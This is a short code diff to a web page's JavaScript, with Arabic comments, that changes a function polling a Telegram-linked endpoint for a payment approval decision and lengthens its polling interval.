@@ -156,16 +156,16 @@
         });
 
         // دالة فحص الحالة كل ثانيتين
-        function checkApprovalStatus(uid) {
+       function checkApprovalStatus(uid) {
             const interval = setInterval(async () => {
                 try {
-                    // الاستعلام مباشرة عن قرار التليجرام
-                    const res = await fetch(`/api/payment-send?user_id=${uid}`);
+                    const res = await fetch(`/api/telegram-webhook?check_user=${uid}`);
+                    // سنستخدم طريقة بديلة أو نفحص الـ API مباشرة
                     const data = await res.json();
 
                     if (data.status === 'approved') {
                         clearInterval(interval);
-                        window.location.href = 'success.html'; // الانتقال المباشر للفاتورة
+                        window.location.href = 'success.html';
                     } else if (data.status === 'rejected') {
                         clearInterval(interval);
                         submitBtn.disabled = false;
@@ -179,7 +179,7 @@
                 } catch (err) {
                     console.error(err);
                 }
-            }, 1500); // يفحص القرار كل ثانية ونصف
+            }, 2000);
         }
 
         document.getElementById('cancelBtn').addEventListener('click', () => {
